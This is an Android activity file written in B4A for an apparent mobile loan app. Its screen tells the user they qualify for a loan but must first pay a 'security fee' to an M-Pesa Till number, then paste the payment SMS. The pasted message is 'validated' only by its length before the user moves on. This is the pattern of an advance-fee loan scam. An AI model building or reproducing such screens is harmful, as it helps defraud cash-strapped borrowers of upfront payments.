B4A=true
Group=Default Group
ModulesStructureVersion=1
Type=Activity
Version=10
@EndOfDesignText@
#Region  Activity Attributes 
	#FullScreen: False
	#IncludeTitle: True
#End Region

Sub Process_Globals
	'These global variables will be declared once when the application starts.
	'These variables can be accessed from all modules.

End Sub

Sub Globals
	'These global variables will be redeclared each time the activity is created.
	'These variables can only be accessed from this module.

	Private Label1 As Label
	Private Panel1 As Panel
	Private edtcode As EditText
	Private BtnConfirm As Button
End Sub

Sub Activity_Create(FirstTime As Boolean)
	'Do not forget to load the layout file created with the visual designer. For example:
	Activity.LoadLayout("SavingsPage")
	Activity.Title=Vuka.title
	
	Dim PageColors As ColorDrawable
	PageColors.Initialize(Vuka.B_Colors,0)
	Panel1.Background=PageColors
	
	Dim names As String
	Dim list As List
	list.Initialize
	If File.Exists(File.DirInternal,"data.dat")Then
		list=File.ReadList(File.DirInternal,"data.dat")
		names=list.Get(0)
	End If
	
	Label1.Text=$"Dear "$&names&$".You qualify for a loan of KShs.${Starter.limit}.Therefore ${Starter.compName} requires you to save KShs.${Starter.saving} to Till No.${Starter.Till} which will act as a security fee.
Your savings will be refunded upon loan repayment.

TAB HERE TO COPY TILL NUMBER"$
	Label1.TextColor=Colors.Black
	Label1.TextSize=14
	
	edtcode.Color=Colors.White
	edtcode.Hint="PASTE THE MPESA MESSAGE HERE"
	edtcode.HintColor=Colors.Magenta
	edtcode.TextColor=Colors.Black
	edtcode.TextSize=14
	edtcode.Gravity=Gravity.CENTER
	
	BtnConfirm.Text="Confirm"
	BtnConfirm.TextColor=Colors.Black
	BtnConfirm.TextSize=15
	
End Sub

Sub Activity_Resume

End Sub

Sub Activity_Pause (UserClosed As Boolean)

End Sub


Sub BtnConfirm_Click
	If edtcode.Text="" Then
	'edtcode.Text=""
	edtcode.Hint="MPESA MESSAGE REQUIRED"
	edtcode.Gravity = Gravity.CENTER
	Return
	Else If edtcode.Text.Length<142 Then 'Or edtcode.Text.Length>175 Then And Not(edtcode.Text.Contains($"${Starter.Till}"$))
		edtcode.Text=""
		edtcode.Hint="INVALID MPESA MESSAGE"
		edtcode.Gravity = Gravity.CENTER
		Return
	
	Else
	StartActivity(SaveConfirm)
	End If
End Sub

Sub Label1_Click
	Dim CLICK As BClipboard
	CLICK.setText(Starter.Till)
	ToastMessageShow($"Till No. ${Starter.Till} Copied To Clipboard"$,True)
End Sub